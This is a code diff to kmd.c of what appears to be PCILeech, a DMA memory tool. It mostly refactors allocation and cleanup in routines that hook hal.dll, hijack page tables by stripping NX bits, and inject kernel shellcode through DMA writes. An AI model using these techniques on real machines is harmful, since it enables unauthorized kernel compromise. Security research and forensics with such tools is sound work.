@@ -1,6 +1,6 @@
 // kmd.c : implementation related to operating systems kernel modules functionality.
 //
-// (c) Ulf Frisk, 2016-2021
+// (c) Ulf Frisk, 2016-2022
 // Author: Ulf Frisk, pcileech@frizk.net
 //
 #include "kmd.h"
@@ -455,9 +455,12 @@ QWORD KMD_Linux48KernelBaseSeek()
             continue;
         }
         // read kernel base +0x1000/+0x2000 (hypercall page?) and check that it ends with at least 0x100 0x00.
+        // alternatively that it ends with a number of (0x90+0xC3)NOP+RET
         if(!LcRead(ctxMain->hLC, qwA + 0x1000, 0x1000, pb) || memcmp(pb + 0xf00, pbCMP00, 0x100)) {
             if(!LcRead(ctxMain->hLC, qwA + 0x2000, 0x1000, pb) || memcmp(pb + 0xf00, pbCMP00, 0x100)) {
-                continue;
+                if(memcmp(pb + 0xfe0, pbCMP90, 0x1f)) {
+                    continue;
+                }
             }
         }
         PageStatClose(&pPageStat);
@@ -1102,8 +1105,8 @@ BOOL KMDOpen_HalHijack()
 {
     DWORD ADDR_HAL_HEAP_PA = 0x00001000;
     //QWORD ADDR_SHELLCODE_VA = 0xffffffffffc00100;
-    BOOL result;
-    SIGNATURE oSignature;
+    BOOL result, fResult = FALSE;
+    PSIGNATURE pSignature = NULL;
     PDWORD pdwPhysicalAddress;
     BYTE pbHal[0x1000] = { 0 }, pbPT[0x1000] = { 0 }, pbNULL[0x300] = { 0 };
     DWORD dwHookFnPgOffset;
@@ -1111,22 +1114,23 @@ BOOL KMDOpen_HalHijack()
     //------------------------------------------------
     // 1: Fetch hal.dll heap and perform sanity checks.
     //------------------------------------------------
-    Util_CreateSignatureWindowsHalGeneric(&oSignature);
+    if(!(pSignature = LocalAlloc(0, sizeof(SIGNATURE)))) { goto fail; }
+    Util_CreateSignatureWindowsHalGeneric(pSignature);
     result = DeviceReadDMA_Retry(ctxMain->hLC, ADDR_HAL_HEAP_PA, 0x1000, pbHal);
     qwPML4 = *(PQWORD)(pbHal + 0xa0);
     qwHalVA = *(PQWORD)(pbHal + 0x78);
     if(!result || (qwPML4 & 0xffffffff00000fff)) {
         printf("KMD: Failed. Error reading or interpreting memory #1.\n");
-        return FALSE;
+        goto fail;
     }
     if(((qwHalVA & 0xfffffffffff00fff) != 0xffffffffffd00000) && ((qwHalVA & 0xffffff803fe00fff) != 0xfffff78000000000)) {
         printf("KMD: Failed. Error reading or interpreting memory #2.\n");
-        return FALSE;
+        goto fail;
     }
     result = Util_PageTable_ReadPTE(qwPML4, qwHalVA, &qwPTEOrig, &qwPTEPA);
     if(!result || ((qwPTEOrig & 0x00007ffffffff003) != 0x1003)) {
         printf("KMD: Failed. Error reading or interpreting PTEs.\n");
-        return FALSE;
+        goto fail;
     }
     //------------------------------------------------
     // 2: Search for function table in hal.dll heap.
@@ -1144,24 +1148,24 @@ BOOL KMDOpen_HalHijack()
     }
     if(!result) {
         printf("KMD: Failed. Failed finding entry point.\n");
-        return FALSE;
+        goto fail;
     }
     qwPTPA = qwPTEPA & ~0xfff;
     result = DeviceReadDMA_Retry(ctxMain->hLC, (DWORD)qwPTPA, 0x1000, pbPT);
     if(!result || memcmp(pbPT + 0x200, pbNULL, 0x300)) { // 0x300 bytes between 0x200:0x500 in Hal PT must be zero
         printf("KMD: Failed. Error reading or interpreting PT.\n");
-        return FALSE;
+        goto fail;
     }
     qwShellcodeVA = (qwAddrHalHeapVA & 0xffffffffffe00000) + 0x40000 + 0x210;
     //------------------------------------------------
     // 3: Write shellcode into page table empty space.
     //------------------------------------------------
     *(PQWORD)(pbPT + 0x200) = qwPTPA | 0x63; // PTE for addr
-    memcpy(pbPT + 0x210, oSignature.chunk[3].pb, oSignature.chunk[3].cb);
+    memcpy(pbPT + 0x210, pSignature->chunk[3].pb, pSignature->chunk[3].cb);
     *(PQWORD)(pbPT + 0x210 + STAGE2_OFFSET_FN_STAGE1_ORIG) = *(PQWORD)(pbHal + dwHookFnPgOffset);
     *(PQWORD)(pbPT + 0x210 + STAGE2_OFFSET_EXTRADATA1) = qwAddrHalHeapVA + dwHookFnPgOffset;
     DeviceWriteDMA_Retry(ctxMain->hLC, qwPTPA + 0x200, 0x300, pbPT + 0x200);
-    Util_PageTable_SetMode(qwPML4, qwShellcodeVA, TRUE);
+    Util_PageTable_SetModeX(qwPML4, qwShellcodeVA);
     //------------------------------------------------
     // 4: Place hook by overwriting function addr in hal.dll heap.
     //------------------------------------------------
@@ -1182,7 +1186,7 @@ BOOL KMDOpen_HalHijack()
         Sleep(100);
         if(!DeviceReadDMA_Retry(ctxMain->hLC, (DWORD)qwPTPA, 4096, pbPT)) {
             printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
-            return FALSE;
+            goto fail;
         }
     } while(!*pdwPhysicalAddress);
     printf("KMD: Execution received - continuing ...\n");
@@ -1194,7 +1198,10 @@ BOOL KMDOpen_HalHijack()
     //------------------------------------------------
     // 7: Set up kernel module shellcode (stage3) and finish.
     //------------------------------------------------
-    return KMD_SetupStage3(*pdwPhysicalAddress, oSignature.chunk[4].pb, 4096);
+    fResult = KMD_SetupStage3(*pdwPhysicalAddress, pSignature->chunk[4].pb, 4096);
+fail:
+    LocalFree(pSignature);
+    return fResult;
 }
 
 //-------------------------------------------------------------------------------
@@ -1234,7 +1241,7 @@ BOOL KMD_SubmitCommand(_In_ QWORD op)
             Exec_CallbackClose(hCallback);
             return FALSE;
         }
-        if((op != KMD_CMD_TERMINATE) && (op != KMD_CMD_MEM_INFO) && (!ctxMain->pk || (ctxMain->pk->MAGIC != KMDDATA_MAGIC) && (ctxMain->pk->MAGIC != KMDDATA_MAGIC_PARTIAL))) {
+        if((op != KMD_CMD_TERMINATE) && (op != KMD_CMD_MEM_INFO) && (!ctxMain->pk || ((ctxMain->pk->MAGIC != KMDDATA_MAGIC) && (ctxMain->pk->MAGIC != KMDDATA_MAGIC_PARTIAL)))) {
             printf("PCILEECH: FAIL: KMDDATA corruption! - bit errors? Address: 0x%08x. Terminating.\n", ctxMain->phKMD->dwPageAddr32);
             LcClose(ctxMain->hLC);
             ExitProcess(0);
@@ -1404,13 +1411,14 @@ VOID KMDClose()
 _Success_(return)
 BOOL KMDOpen_MemoryScan()
 {
-    PSIGNATURE pSignature, pSignatures = NULL;
+    PSIGNATURE pSignature = NULL, pSignatures = NULL;
     DWORD dwSignatureMatchIdx, cSignatures = CONFIG_MAX_SIGNATURES;
-    KMDHANDLE_S12 h1, h2;
+    PKMDHANDLE_S12 ph1 = NULL, ph2 = NULL;
     PDWORD pdwPhysicalAddress;
-    BOOL result;
-    pSignatures = LocalAlloc(LMEM_ZEROINIT, CONFIG_MAX_SIGNATURES * sizeof(SIGNATURE));
-    if(!pSignatures) { goto fail; }
+    BOOL fResult = FALSE;
+    if(!(ph1 = LocalAlloc(LMEM_ZEROINIT, sizeof(KMDHANDLE_S12)))) { goto fail; }
+    if(!(ph2 = LocalAlloc(LMEM_ZEROINIT, sizeof(KMDHANDLE_S12)))) { goto fail; }
+    if(!(pSignatures = LocalAlloc(LMEM_ZEROINIT, CONFIG_MAX_SIGNATURES * sizeof(SIGNATURE)))) { goto fail; }
     //------------------------------------------------
     // 1: Load signature
     //------------------------------------------------
@@ -1459,30 +1467,30 @@ BOOL KMDOpen_MemoryScan()
     //------------------------------------------------
     // 3: Set up patch data.
     //------------------------------------------------
-    h1.qwPageAddr = pSignature->chunk[0].qwAddress;
-    h2.qwPageAddr = pSignature->chunk[1].qwAddress;
-    h1.dwPageOffset = 0xfff & pSignature->chunk[2].cbOffset;
-    h2.dwPageOffset = 0xfff & pSignature->chunk[3].cbOffset;
-    DeviceReadDMA_Retry(ctxMain->hLC, h1.qwPageAddr, 4096, h1.pbOrig);
-    DeviceReadDMA_Retry(ctxMain->hLC, h2.qwPageAddr, 4096, h2.pbOrig);
-    memcpy(h1.pbPatch, h1.pbOrig, 4096);
-    memcpy(h2.pbPatch, h2.pbOrig, 4096);
-    memcpy(h1.pbPatch + h1.dwPageOffset, pSignature->chunk[2].pb, pSignature->chunk[2].cb);
-    memcpy(h2.pbPatch + h2.dwPageOffset, pSignature->chunk[3].pb, pSignature->chunk[3].cb);
+    ph1->qwPageAddr = pSignature->chunk[0].qwAddress;
+    ph2->qwPageAddr = pSignature->chunk[1].qwAddress;
+    ph1->dwPageOffset = 0xfff & pSignature->chunk[2].cbOffset;
+    ph2->dwPageOffset = 0xfff & pSignature->chunk[3].cbOffset;
+    DeviceReadDMA_Retry(ctxMain->hLC, ph1->qwPageAddr, 4096, ph1->pbOrig);
+    DeviceReadDMA_Retry(ctxMain->hLC, ph2->qwPageAddr, 4096, ph2->pbOrig);
+    memcpy(ph1->pbPatch, ph1->pbOrig, 4096);
+    memcpy(ph2->pbPatch, ph2->pbOrig, 4096);
+    memcpy(ph1->pbPatch + ph1->dwPageOffset, pSignature->chunk[2].pb, pSignature->chunk[2].cb);
+    memcpy(ph2->pbPatch + ph2->dwPageOffset, pSignature->chunk[3].pb, pSignature->chunk[3].cb);
     // patch jump offset in stage1
-    *(PDWORD)(h1.pbPatch + h1.dwPageOffset + STAGE1_OFFSET_CALL_ADD) += pSignature->chunk[3].cbOffset - pSignature->chunk[2].cbOffset;
+    *(PDWORD)(ph1->pbPatch + ph1->dwPageOffset + STAGE1_OFFSET_CALL_ADD) += pSignature->chunk[3].cbOffset - pSignature->chunk[2].cbOffset;
     // patch original stage1 data in stage2 (needed for stage1 restore)
-    memcpy(h2.pbPatch + h2.dwPageOffset + STAGE2_OFFSET_FN_STAGE1_ORIG, h1.pbOrig + h1.dwPageOffset, 8);
+    memcpy(ph2->pbPatch + ph2->dwPageOffset + STAGE2_OFFSET_FN_STAGE1_ORIG, ph1->pbOrig + ph1->dwPageOffset, 8);
     // patch offset to extra function relative to stage2 entry point: windows = n/a, linux=kallsyms_lookup_name, mac=kernel_mach-o_header
-    *(PDWORD)(h2.pbPatch + h2.dwPageOffset + STAGE2_OFFSET_EXTRADATA1) = pSignature->chunk[4].cbOffset - pSignature->chunk[3].cbOffset;
+    *(PDWORD)(ph2->pbPatch + ph2->dwPageOffset + STAGE2_OFFSET_EXTRADATA1) = pSignature->chunk[4].cbOffset - pSignature->chunk[3].cbOffset;
     //------------------------------------------------
     // 4: Write patched data to memory.
     //------------------------------------------------
-    if(!DeviceWriteDMA_Verify(ctxMain->hLC, h2.qwPageAddr, 4096, h2.pbPatch)) {
+    if(!DeviceWriteDMA_Verify(ctxMain->hLC, ph2->qwPageAddr, 4096, ph2->pbPatch)) {
         printf("KMD: Failed. Signature found but unable write #2.\n");
         goto fail;
     }
-    if(!LcWrite(ctxMain->hLC, h1.qwPageAddr, 4096, h1.pbPatch)) { // stage1 (must be written after stage2)
+    if(!LcWrite(ctxMain->hLC, ph1->qwPageAddr, 4096, ph1->pbPatch)) { // stage1 (must be written after stage2)
         printf("KMD: Failed. Signature found but unable write #1.\n");
         goto fail;
     }
@@ -1490,10 +1498,10 @@ BOOL KMDOpen_MemoryScan()
     //------------------------------------------------
     // 5: wait for patch to reveive execution.
     //------------------------------------------------
-    pdwPhysicalAddress = (PDWORD)(h2.pbLatest + h2.dwPageOffset + STAGE2_OFFSET_STAGE3_PHYSADDR);
+    pdwPhysicalAddress = (PDWORD)(ph2->pbLatest + ph2->dwPageOffset + STAGE2_OFFSET_STAGE3_PHYSADDR);
     do {
         Sleep(100);
-        if(!DeviceReadDMA_Retry(ctxMain->hLC, h2.qwPageAddr, 4096, h2.pbLatest)) {
+        if(!DeviceReadDMA_Retry(ctxMain->hLC, ph2->qwPageAddr, 4096, ph2->pbLatest)) {
             printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
             goto fail;
         }
@@ -1502,14 +1510,16 @@ BOOL KMDOpen_MemoryScan()
     //------------------------------------------------
     // 6: Restore hooks to original.
     //------------------------------------------------
-    LcWrite(ctxMain->hLC, h2.qwPageAddr, 4096, h2.pbOrig);
+    LcWrite(ctxMain->hLC, ph2->qwPageAddr, 4096, ph2->pbOrig);
     //------------------------------------------------
     // 7: Set up kernel module shellcode (stage3) and finish.
     //------------------------------------------------
-    result = KMD_SetupStage3(*pdwPhysicalAddress, pSignature->chunk[4].pb, 4096);
-    return result;
+    fResult = KMD_SetupStage3(*pdwPhysicalAddress, pSignature->chunk[4].pb, 4096);
 fail:
-    return FALSE;
+    LocalFree(ph1);
+    LocalFree(ph2);
+    LocalFree(pSignature);
+    return fResult;
 }
 
 _Success_(return)
@@ -1519,13 +1529,14 @@ BOOL KMDOpen_PageTableHijack()
     QWORD qwModuleBase;
     PSIGNATURE pSignature, pSignatures = NULL;
     DWORD cSignatures = CONFIG_MAX_SIGNATURES;
-    KMDHANDLE_S12 h1, h2;
+    PKMDHANDLE_S12 ph1 = NULL, ph2 = NULL;
     PSIGNATUREPTE pSignaturePTEs;
     QWORD cSignaturePTEs;
     PDWORD pdwPhysicalAddress;
-    BOOL result;
-    pSignatures = LocalAlloc(LMEM_ZEROINIT, CONFIG_MAX_SIGNATURES * sizeof(SIGNATURE));
-    if(!pSignatures) { goto fail; }
+    BOOL result, fResult = FALSE;
+    if(!(ph1 = LocalAlloc(LMEM_ZEROINIT, sizeof(KMDHANDLE_S12)))) { goto fail; }
+    if(!(ph2 = LocalAlloc(LMEM_ZEROINIT, sizeof(KMDHANDLE_S12)))) { goto fail; }
+    if(!(pSignatures = LocalAlloc(LMEM_ZEROINIT, CONFIG_MAX_SIGNATURES * sizeof(SIGNATURE)))) { goto fail; }
     //------------------------------------------------
     // 1: Load signature and patch data.
     //------------------------------------------------
@@ -1556,12 +1567,12 @@ BOOL KMDOpen_PageTableHijack()
         printf("KMD: Failed. Could not find module base by PTE search.\n");
         goto fail;
     }
-    result = Util_PageTable_ReadPTE(qwCR3, qwModuleBase + pSignature->chunk[2].cbOffset, &h1.qwPTEOrig, &h1.qwPTEAddrPhys);
+    result = Util_PageTable_ReadPTE(qwCR3, qwModuleBase + pSignature->chunk[2].cbOffset, &ph1->qwPTEOrig, &ph1->qwPTEAddrPhys);
     if(!result) {
         printf("KMD: Failed. Could not access PTE #1.\n");
         goto fail;
     }
-    result = Util_PageTable_ReadPTE(qwCR3, qwModuleBase + pSignature->chunk[3].cbOffset, &h2.qwPTEOrig, &h2.qwPTEAddrPhys);
+    result = Util_PageTable_ReadPTE(qwCR3, qwModuleBase + pSignature->chunk[3].cbOffset, &ph2->qwPTEOrig, &ph2->qwPTEAddrPhys);
     if(!result) {
         printf("KMD: Failed. Could not access PTE #2.\n");
         goto fail;
@@ -1570,48 +1581,48 @@ BOOL KMDOpen_PageTableHijack()
     // 3: Set up patch data.
     //------------------------------------------------
     // hijack "random" page in memory if target page is above 4GB - dangerous!!!
-    h1.qwPageAddr = (h1.qwPTEOrig < 0x100000000) ? (h1.qwPTEOrig & 0xfffff000) : 0x90000;
-    h2.qwPageAddr = (h2.qwPTEOrig < 0x100000000) ? (h2.qwPTEOrig & 0xfffff000) : 0x91000;
-    h1.dwPageOffset = 0xfff & pSignature->chunk[2].cbOffset;
-    h2.dwPageOffset = 0xfff & pSignature->chunk[3].cbOffset;
-    memcpy(h1.pbPatch, pSignature->chunk[0].pb, 4096);
-    memcpy(h2.pbPatch, pSignature->chunk[1].pb, 4096);
-    memcpy(h1.pbPatch + h1.dwPageOffset, pSignature->chunk[2].pb, pSignature->chunk[2].cb);
-    memcpy(h2.pbPatch + h2.dwPageOffset, pSignature->chunk[3].pb, pSignature->chunk[3].cb);
+    ph1->qwPageAddr = (ph1->qwPTEOrig < 0x100000000) ? (ph1->qwPTEOrig & 0xfffff000) : 0x90000;
+    ph2->qwPageAddr = (ph2->qwPTEOrig < 0x100000000) ? (ph2->qwPTEOrig & 0xfffff000) : 0x91000;
+    ph1->dwPageOffset = 0xfff & pSignature->chunk[2].cbOffset;
+    ph2->dwPageOffset = 0xfff & pSignature->chunk[3].cbOffset;
+    memcpy(ph1->pbPatch, pSignature->chunk[0].pb, 4096);
+    memcpy(ph2->pbPatch, pSignature->chunk[1].pb, 4096);
+    memcpy(ph1->pbPatch + ph1->dwPageOffset, pSignature->chunk[2].pb, pSignature->chunk[2].cb);
+    memcpy(ph2->pbPatch + ph2->dwPageOffset, pSignature->chunk[3].pb, pSignature->chunk[3].cb);
     // patch jump offset in stage1
-    *(PDWORD)(h1.pbPatch + h1.dwPageOffset + STAGE1_OFFSET_CALL_ADD) += pSignature->chunk[3].cbOffset - pSignature->chunk[2].cbOffset;
+    *(PDWORD)(ph1->pbPatch + ph1->dwPageOffset + STAGE1_OFFSET_CALL_ADD) += pSignature->chunk[3].cbOffset - pSignature->chunk[2].cbOffset;
     // patch original stage1 data in stage2 (needed for stage1 restore)
-    memcpy(h2.pbPatch + h2.dwPageOffset + STAGE2_OFFSET_FN_STAGE1_ORIG, pSignature->chunk[0].pb + h1.dwPageOffset, 8);
+    memcpy(ph2->pbPatch + ph2->dwPageOffset + STAGE2_OFFSET_FN_STAGE1_ORIG, pSignature->chunk[0].pb + ph1->dwPageOffset, 8);
     // patch offset to extra function relative to stage2 entry point: windows = n/a, linux=kallsyms_lookup_name
-    *(PDWORD)(h2.pbPatch + h2.dwPageOffset + STAGE2_OFFSET_EXTRADATA1) = pSignature->chunk[4].cbOffset - pSignature->chunk[3].cbOffset;
+    *(PDWORD)(ph2->pbPatch + ph2->dwPageOffset + STAGE2_OFFSET_EXTRADATA1) = pSignature->chunk[4].cbOffset - pSignature->chunk[3].cbOffset;
     // calculate new PTEs
-    h1.qwPTE = 0x7ff0000000000fff & h1.qwPTEOrig; // Strip NX-bit and previous physical address
-    h2.qwPTE = 0x7ff0000000000fff & h2.qwPTEOrig; // Strip NX-bit and previous physical address
-    h1.qwPTE |= 0x00000002; // set write
-    h2.qwPTE |= 0x00000002; // set write
-    h1.qwPTE |= 0xfffff000 & h1.qwPageAddr;
-    h2.qwPTE |= 0xfffff000 & h2.qwPageAddr;
+    ph1->qwPTE = 0x7ff0000000000fff & ph1->qwPTEOrig; // Strip NX-bit and previous physical address
+    ph2->qwPTE = 0x7ff0000000000fff & ph2->qwPTEOrig; // Strip NX-bit and previous physical address
+    ph1->qwPTE |= 0x00000002; // set write
+    ph2->qwPTE |= 0x00000002; // set write
+    ph1->qwPTE |= 0xfffff000 & ph1->qwPageAddr;
+    ph2->qwPTE |= 0xfffff000 & ph2->qwPageAddr;
     //------------------------------------------------
     // 4: Write patched data and PTEs to memory.
     //------------------------------------------------
-    LcRead(ctxMain->hLC, h1.qwPageAddr, 4096, h1.pbOrig);
-    LcRead(ctxMain->hLC, h2.qwPageAddr, 4096, h2.pbOrig);
-    if(!DeviceWriteDMA_Verify(ctxMain->hLC, h2.qwPageAddr, 4096, h2.pbPatch) ||
-        !DeviceWriteDMA_Verify(ctxMain->hLC, h1.qwPageAddr, 4096, h1.pbPatch)) {
+    LcRead(ctxMain->hLC, ph1->qwPageAddr, 4096, ph1->pbOrig);
+    LcRead(ctxMain->hLC, ph2->qwPageAddr, 4096, ph2->pbOrig);
+    if(!DeviceWriteDMA_Verify(ctxMain->hLC, ph2->qwPageAddr, 4096, ph2->pbPatch) ||
+        !DeviceWriteDMA_Verify(ctxMain->hLC, ph1->qwPageAddr, 4096, ph1->pbPatch)) {
         printf("KMD: Failed. Signature found but unable write.\n");
         goto fail;
     }
-    LcWrite(ctxMain->hLC, h2.qwPTEAddrPhys, sizeof(QWORD), (PBYTE)&h2.qwPTE);
+    LcWrite(ctxMain->hLC, ph2->qwPTEAddrPhys, sizeof(QWORD), (PBYTE)&ph2->qwPTE);
     Sleep(250);
-    LcWrite(ctxMain->hLC, h1.qwPTEAddrPhys, sizeof(QWORD), (PBYTE)&h1.qwPTE);
+    LcWrite(ctxMain->hLC, ph1->qwPTEAddrPhys, sizeof(QWORD), (PBYTE)&ph1->qwPTE);
     //------------------------------------------------
     // 5: wait for patch to reveive execution.
     //------------------------------------------------
     printf("KMD: Page Table hijacked - Waiting to receive execution.\n");
-    pdwPhysicalAddress = (PDWORD)(h2.pbLatest + h2.dwPageOffset + STAGE2_OFFSET_STAGE3_PHYSADDR);
+    pdwPhysicalAddress = (PDWORD)(ph2->pbLatest + ph2->dwPageOffset + STAGE2_OFFSET_STAGE3_PHYSADDR);
     do {
         Sleep(100);
-        if(!DeviceReadDMA_Retry(ctxMain->hLC, h2.qwPageAddr, 4096, h2.pbLatest)) {
+        if(!DeviceReadDMA_Retry(ctxMain->hLC, ph2->qwPageAddr, 4096, ph2->pbLatest)) {
             printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
             goto fail;
         }
@@ -1620,18 +1631,20 @@ BOOL KMDOpen_PageTableHijack()
     //------------------------------------------------
     // 6: Restore hijacked memory pages.
     //------------------------------------------------
-    LcWrite(ctxMain->hLC, h1.qwPTEAddrPhys, sizeof(QWORD), (PBYTE)&h1.qwPTEOrig);
-    LcWrite(ctxMain->hLC, h2.qwPTEAddrPhys, sizeof(QWORD), (PBYTE)&h2.qwPTEOrig);
+    LcWrite(ctxMain->hLC, ph1->qwPTEAddrPhys, sizeof(QWORD), (PBYTE)&ph1->qwPTEOrig);
+    LcWrite(ctxMain->hLC, ph2->qwPTEAddrPhys, sizeof(QWORD), (PBYTE)&ph2->qwPTEOrig);
     Sleep(100);
-    LcWrite(ctxMain->hLC, h1.qwPageAddr, 4096, h1.pbOrig);
-    LcWrite(ctxMain->hLC, h2.qwPageAddr, 4096, h2.pbOrig);
+    LcWrite(ctxMain->hLC, ph1->qwPageAddr, 4096, ph1->pbOrig);
+    LcWrite(ctxMain->hLC, ph2->qwPageAddr, 4096, ph2->pbOrig);
     //------------------------------------------------
     // 7: Set up kernel module shellcode (stage3) and finish.
     //------------------------------------------------
-    result = KMD_SetupStage3(*pdwPhysicalAddress, pSignature->chunk[4].pb, 4096);
-    return result;
+    fResult = KMD_SetupStage3(*pdwPhysicalAddress, pSignature->chunk[4].pb, 4096);
 fail:
-    return FALSE;
+    LocalFree(ph1);
+    LocalFree(ph2);
+    LocalFree(pSignatures);
+    return fResult;
 }
 
 _Success_(return)
